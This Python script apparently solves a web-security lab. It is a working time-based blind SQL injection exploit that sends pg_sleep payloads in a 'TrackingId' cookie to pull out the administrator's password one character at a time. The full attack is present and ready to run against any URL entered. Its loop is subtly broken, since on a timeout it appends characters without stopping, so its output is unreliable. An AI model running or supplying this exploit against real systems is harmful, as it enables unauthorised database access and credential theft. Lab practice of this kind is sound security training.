import requests
import string


URL = input("Input URL: ").strip()
template = input("Input cookie: ") # Example: "xyz'SELECT CASE WHEN SUBSTRING(password, {i}, 1)='{char}' THEN pg_sleep(5) ELSE pg_sleep(0) END FROM users WHERE username='administrator' LIMIT 1--"
charset = string.ascii_letters + string.digits
password = ''

print("Brute Force...")
for i in range(1, 50):
    found = False
    for char in charset:
        cookie_payload = template.format(i=i, char=char)
        cookies = {"TrackingId" : cookie_payload}
        
        try:
            response = requests.get(URL, cookies=cookies, timeout=3)
            
            if "Welcome back!" in response.text:
                password += char
                print(f"No-{i} found '{char} --> password = {password}")
                found = True
                break
        
        except requests.exceptions.Timeout:
            password += char
            print(f"No-{i} found '{char} --> password = {password}")
        
    if not found:
        print("Done!")
        break
print(f"/n Password = {password}")
